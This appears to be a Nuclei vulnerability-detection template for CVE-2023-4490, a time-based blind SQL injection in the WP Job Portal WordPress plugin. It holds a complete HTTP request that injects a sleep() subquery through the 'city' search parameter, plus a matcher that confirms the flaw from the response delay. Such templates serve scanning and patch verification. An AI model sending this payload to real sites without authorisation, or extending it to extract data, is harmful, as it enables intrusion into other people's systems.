id: CVE-2023-4490

info:
  name: WordPress Job Portal 2.0.6 - SQL Injection (Time-Based)
  author: paresh_parmar1, Configtea
  severity: high
  description: |
    The WP Job Portal WordPress plugin before 2.0.6 does not sanitise and escape a parameter before using it in a SQL statement, leading to a SQL injection exploitable by unauthenticated users.
    SQL Injection in the `city` parameter of the WordPress Job Portal plugin via Time-Based Blind SQL Injection.
  reference:
    - https://wpscan.com/vulnerability/986024f0-3c8d-44d8-a9c9-1dd284d7db0d/
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4490
  tags: sqli,wordpress,job-portal,time-based

http:
  - raw:
      - |
        @timeout: 25s
        POST /wp-job-portal-jobseeker-controlpanel/jobs HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
        Connection: close
        Content-Length: 291
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

        jobtitle=aaaa&salarytype=&salaryfixed=&salarymin=&salarymax=&salaryduration=2&duration=&city=(select*from(select(sleep(12)))a)&metakeywords=&save=Search+Job&default_longitude=71.2577233&default_latitude=29.1411551&issearchform=1&WPJOBPORTAL_form_search=WPJOBPORTAL_SEARCH&wpjobportallay=jobs

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 12"  # Response delay >=12s confirms SQLi vulnerability
